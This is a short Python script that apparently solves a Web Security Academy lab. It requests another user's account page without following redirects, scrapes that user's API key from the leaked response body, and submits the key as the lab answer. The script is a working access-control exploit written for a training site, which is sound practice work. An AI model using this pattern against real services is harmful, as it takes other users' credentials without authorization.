import requests
from bs4 import BeautifulSoup
import re
s = requests.Session()

site = 'acc71f071e02b7ee80acb909000f00ea.web-security-academy.net'

'''login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)'''

carlos_account_url = f'https://{site}/my-account/?id=carlos'
resp = s.get(carlos_account_url, allow_redirects=False)
print(resp.text)
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(api_key)

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})